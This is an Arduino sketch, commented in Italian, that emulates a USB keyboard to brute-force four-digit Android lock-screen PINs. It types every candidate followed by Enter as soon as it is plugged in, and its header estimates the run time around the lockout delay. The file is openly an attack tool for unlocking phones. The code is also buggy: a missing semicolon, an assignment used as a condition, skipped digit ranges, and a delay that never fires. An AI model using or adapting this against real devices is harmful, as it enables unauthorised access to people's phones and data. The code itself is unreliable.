#include <Keyboard.h>

/*
 * PIN Bruteforcer 
 * di Hermann Magliacane
 * 
 * Calcolo tempo stimato:
 * (10)^4=10.000 disposizioni con ripetizioni
10.000/5 (batteria minima) = 2000 batterie
Considerando che ogni batteria dura 31secondi(1secondo per la batteria + 28 di attesa)
Possiamo dire che 2000 batterie (2000*31) dureranno 62000 secondi ovvero 1033,333333333 minuti ovvero 17,222222222 ore.
Se non ci fosse il blocco dei 28secondi, il pin da 4 cifre verrebbe individuato in un tempo largamento stimato di meno 2000secondi ovvero 33,333333333 minuti (anche molto prima se consideriamo che il pin può avere cifre molto più basse di 9999).

PRO:
 - vengono gestiti i tentativi
 - viene gestito un dizionario di PIN comuni (da fare)

CONS:
 - funziona solo per PIN da 4 cifre
 - Appena collegato con un dispositivo via USB, esegue indiscriminatamente il tentativo di attacco brute force inviando le combinazioni
 - Non è possibile scoprire il PIN corretto, ma solo determinarlo orientativamente.

 */


 
int tentativi=51100
int ritardo=0.001; // ogni 5 tentativi 30 secondi di ritardo. Standard android

String tentativo_s;
int tentativo_i;
int arresta=0;

void setup() {
  delay(1000); // piccolo ritardo per far sì che il dispositivo riesca a inizializzare il programma
  // put your setup code here, to run once:
  Keyboard.begin();
  Serial.begin(9600);
}

/*
Eventualmente per usare il mouse si può importare la libreria #include <Mouse.h>
Mouse.move(25, 50, 0);
*/

void loop() {
  delay(100); // piccolo ritardo per far sì che il dispositivo riesca a inizializzare il programma

  if(arresta=1){
   for(int a=1; a<=9; a++){
    for(int b=1; b<=9; b++){
      for(int c=0; c<=9; c++){
        for(int d=0; d<=9; d++){          
          tentativo_i=a*1000+b*100+c*10+d;
          tentativo_s=String(a)+String(b)+String(c)+String(d);
          Serial.println(tentativo_s);    Keyboard.print(tentativo_s);
          delay(100);
          Keyboard.write(0xB0); // emuliamo il tasto invio della tastiera, l'accesso viene effettuato in automatico
          //delay(100);
          if(tentativo_i % tentativi ==0 ) { Serial.print("Ritardo "); Serial.print(ritardo); Serial.println(" secondi"); delay(ritardo * 1000); }
        }
      }
    }
   }
   
   arresta=1;
  }
    
  
}

/*
See more examples:
 - http://blog.infosecsee.com/2014/01/brute-forcing-android-pins-with-arduino.html
*/
